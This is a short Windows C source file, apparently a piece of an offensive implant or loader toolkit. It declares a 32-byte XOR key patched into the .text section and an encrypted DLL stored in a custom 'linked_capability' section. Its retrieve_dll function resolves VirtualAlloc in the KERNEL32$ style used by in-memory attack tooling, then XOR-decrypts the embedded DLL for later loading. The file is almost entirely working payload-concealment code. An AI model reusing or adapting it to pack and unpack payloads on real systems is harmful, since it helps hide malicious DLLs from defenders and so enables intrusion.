#include <windows.h>

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

char XOR_KEY[32] __attribute__((section(".text")));
char __DLLDATA__[0] __attribute__((section("linked_capability")));

typedef struct _ENCRYPTED_CAPABILITY {
    int length;
    char value[];
} _ENCRYPTED_CAPABILITY;

char *retrieve_dll() {
	// Retriever that uses a patched-in encryption key to xor-decrypt the linked capability (with prepended length).
	
	_ENCRYPTED_CAPABILITY *encrypted = (_ENCRYPTED_CAPABILITY *) &__DLLDATA__;
	char *decrypted = KERNEL32$VirtualAlloc(NULL, encrypted->length, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	
    for (int i = 0; i < encrypted->length; i++) {
        decrypted[i] = encrypted->value[i] ^ XOR_KEY[i % 32];
    }
    
    return decrypted;
}
